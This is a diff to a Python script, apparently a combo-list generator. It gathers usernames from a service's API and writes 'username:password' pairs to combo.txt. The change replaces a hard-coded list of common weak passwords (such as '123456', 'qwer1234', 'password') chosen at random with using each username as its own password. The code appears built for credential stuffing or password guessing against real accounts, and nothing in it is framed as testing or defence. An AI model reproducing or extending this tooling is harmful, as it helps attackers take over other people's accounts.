@@ -87,33 +87,11 @@ def fg(id):
     for i in r.json()['users']:
         gg+=1
         userL = i['username']
-        pas= [
-                  "123456",
-    "12345@@",
-     userL,
-    "qwerqwer",
-    "Aa1234",
-    "00998877",
-    "qqwweerr",
-    "1q2w3e4r",
-    "1234567",
-    "12345678",
-    "098765",
-    "qwertyuiop",
-    "11223344",
-    "1122334455",
-    "qwer1234",
-    "password",
-    "mmnnbbvv",
-    "ppooiiuu",
-    "12345a",
-    "123456789"
-]
 
   
               
                 
-        pasw= random.choice(pas)
+        pasw= userL
         print(f'{Y}{gg} {M}» {H}{userL} / {pasw}')
         open("combo.txt", "a").write(f'{userL}:{pasw}\n')
     if 'HI' in listoo:
@@ -129,32 +107,10 @@ def fg(id):
                 for i in r.json()['users']:
                     gg+=1
                     userL = i["username"]
-                    pas= [
-                  "123456",
-    "12345@@",
-     user,
-    "qwerqwer",
-    "Aa1234",
-    "00998877",
-    "qqwweerr",
-    "1q2w3e4r",
-    "1234567",
-    "12345678",
-    "098765",
-    "qwertyuiop",
-    "11223344",
-    "1122334455",
-    "qwer1234",
-    "password",
-    "mmnnbbvv",
-    "ppooiiuu",
-    "12345a",
-    "123456789"
-]
 
   
               
-                    pasw= random.choice(pas)
+                    pasw= userL
 
 
                     print(f'{Y}{gg} {M}» {H}{userL} / {pasw}')
